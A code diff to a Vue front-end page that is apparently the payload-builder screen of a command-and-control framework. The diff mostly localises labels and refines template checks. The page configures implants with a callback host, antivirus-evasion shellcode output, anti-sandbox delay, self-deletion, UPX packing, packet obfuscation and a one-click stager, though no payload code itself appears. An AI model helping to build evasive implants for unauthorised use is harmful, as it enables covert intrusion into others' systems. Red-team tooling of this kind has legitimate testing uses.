@@ -5,7 +5,7 @@
         <el-card shadow="never" class="main-card">
           <template #header>
             <div class="card-header">
-              <span class="title-with-icon"><el-icon><Monitor /></el-icon> 受控端生成 (Payload Generator)</span>
+              <span class="title-with-icon"><el-icon><Monitor /></el-icon> 受控端生成</span>
               <el-tag type="info" size="small" effect="plain">插件管理中心</el-tag>
             </div>
           </template>
@@ -14,17 +14,17 @@
             <!-- Template Missing Warning -->
             <transition name="el-zoom-in-top">
               <el-alert
-                v-if="!templatesReady && form.mode === 'patch'"
-                title="受控端基础模板未就绪"
+                v-if="showTemplateWarning"
+                title="目标平台模板未就绪"
                 type="warning"
-                description="‘二进制补丁’模式需要服务端存在预编译模板。请在服务端终端运行 ./generate_templates.sh，或切换到‘源码级编译’模式。"
+                description="‘二进制补丁’模式需要对应的预编译模板。请先在服务端编译模板，或切换到‘源码级编译’模式。"
                 show-icon
                 :closable="false"
                 style="margin-bottom: 20px"
               />
             </transition>
             <!-- 1. Platform Matrix (Simplified) -->
-            <el-form-item label="1. 选择目标平台 (High Value Targets)" required>
+            <el-form-item label="1. 选择目标平台" required>
               <div class="platform-selector">
                 <div class="os-group">
                   <span class="os-label"><el-icon><Monitor /></el-icon> Windows</span>
@@ -69,7 +69,7 @@
                 </el-form-item>
               </el-col>
               <el-col :span="12">
-                <el-form-item label="3. 配置回连地址 (C2 Host Override)">
+                <el-form-item label="3. 配置回连地址" v-if="selectedListener?.protocol !== '正向TCP' && selectedListener?.protocol !== 'Bind-TCP'">
                   <el-input v-model="form.lhost" placeholder="例如: 1.2.3.4 或 c2.domain.com" size="large">
                     <template #prepend><el-icon><Link /></el-icon></template>
                   </el-input>
@@ -118,7 +118,7 @@
                 </el-form-item>
               </el-col>
               <el-col :span="12">
-                <el-form-item label="5. 免杀增强 (Bypass Options)" v-if="form.combinedType.startsWith('windows')">
+                <el-form-item label="5. 免杀增强" v-if="form.combinedType.startsWith('windows')">
                   <el-checkbox v-model="form.asShellcode" border size="default" class="shellcode-check">
                     生成 Shellcode (.bin) 用于内存加载
                   </el-checkbox>
@@ -127,33 +127,33 @@
             </el-row>
 
             <el-collapse v-model="activeCollapse" class="advanced-collapse">
-              <el-collapse-item title="隐蔽行为配置 (Stealth Behaviors)" name="stealth">
+              <el-collapse-item title="隐蔽行为配置" name="stealth">
                 <el-row :gutter="40">
                   <el-col :span="12">
-                    <el-form-item label="抗沙箱休眠 (Sleep Timer)">
+                    <el-form-item label="抗沙箱休眠">
                       <el-input-number v-model="form.sleepTime" :min="0" :max="600" size="small" />
                       <span class="form-hint">秒 (运行前进入深呼吸模拟，绕过动态检测)</span>
                     </el-form-item>
                   </el-col>
                   <el-col :span="12">
-                    <el-form-item label="运行后自毁 (Self Destruct)">
+                    <el-form-item label="运行后自毁">
                       <el-switch v-model="form.autoDestruct" active-color="#f56c6c" />
                       <span class="form-hint">执行一次自动上线后立即尝试删除自身二进制</span>
                     </el-form-item>
                   </el-col>
                   <el-col :span="12">
-                    <el-form-item label="UPX 极限压缩 (Compression)">
+                    <el-form-item label="UPX 极限压缩">
                       <el-switch v-model="form.useUPX" active-color="#409EFF" />
                       <span class="form-hint">通过 UPX 压缩二进制体积 (约缩减 60%)</span>
                     </el-form-item>
                   </el-col>
                 </el-row>
 
-                <el-divider><el-icon><Lock /></el-icon> 安全加固 (Security Hardening)</el-divider>
+                <el-divider><el-icon><Lock /></el-icon> 安全加固</el-divider>
                 
                 <el-row :gutter="40">
                   <el-col :span="12">
-                    <el-form-item label="加密盐值 (Encryption Salt)">
+                    <el-form-item label="加密盐值">
                       <el-input v-model="form.encryption_salt" placeholder="由所选监听器自动填入" size="small" readonly>
                         <template #prepend><el-icon><Key /></el-icon></template>
                       </el-input>
@@ -161,10 +161,10 @@
                     </el-form-item>
                   </el-col>
                   <el-col :span="12">
-                    <el-form-item label="报文混淆 (Packet Obfuscation)">
+                    <el-form-item label="报文混淆">
                       <el-select v-model="form.obfuscation_mode" style="width: 100%" size="small" disabled>
-                        <el-option label="无混淆 (None)" value="none" />
-                        <el-option label="垃圾数据填充 (Junk Padding)" value="junk" />
+                        <el-option label="无混淆" value="none" />
+                        <el-option label="垃圾数据填充" value="junk" />
                         <el-option label="Base64 编码 (文本特征)" value="base64" />
                         <el-option label="XOR 混淆 (高熵特征)" value="xor" />
                       </el-select>
@@ -199,7 +199,7 @@
         <el-card shadow="never" class="stager-card">
           <template #header>
             <div class="stager-header">
-              <span class="title-with-icon"><el-icon><Cpu /></el-icon> 一键上线 (Quick Online)</span>
+              <span class="title-with-icon"><el-icon><Cpu /></el-icon> 一键上线</span>
             </div>
           </template>
           <div class="stager-body" v-loading="stagerLoading">
@@ -318,7 +318,15 @@ let xterm = null
 let fitAddon = null
 let ws = null
 const terminalContainer = ref(null)
-const templatesReady = ref(true)
+const templateStatus = ref({ win: true, lin: true })
+
+const showTemplateWarning = computed(() => {
+  if (form.value.mode !== 'patch') return false
+  const os = form.value.combinedType.split('_')[0]
+  if (os === 'windows') return !templateStatus.value.win
+  if (os === 'linux') return !templateStatus.value.lin
+  return false
+})
 
 // form.combinedType is split into os and arch for backend compatibility
 const form = ref({
@@ -347,7 +355,8 @@ onMounted(async () => {
   // Check template status from dashboard API
   try {
     const dashRes = await request.get('/api/dashboard')
-    templatesReady.value = dashRes.data.templates_ready
+    templateStatus.value.win = dashRes.data.win_template
+    templateStatus.value.lin = dashRes.data.lin_template
   } catch (e) {
     console.warn("Failed to fetch template status", e)
   }
@@ -380,12 +389,12 @@ const previewUrl = computed(() => {
     return `ws://${form.value.lhost}:${selectedListener.value.port}/ws`
   }
   if (proto === '正向tcp' || proto === 'bind-tcp') {
-    return `Waiting for connection on ${form.value.lhost}:${selectedListener.value.port}`
+    return `受控端将在目标机器监听端口: ${selectedListener.value.port}`
   }
   if (proto === 'dns') {
-    return `${selectedListener.value.ns_domain}`
+    return `DNS 域名: ${selectedListener.value.ns_domain}`
   }
-  return `${proto}://${form.value.lhost}:${selectedListener.value.port}`
+  return `${selectedListener.value.protocol}://${form.value.lhost}:${selectedListener.value.port}`
 })
 
 const onListenerChange = (id) => {
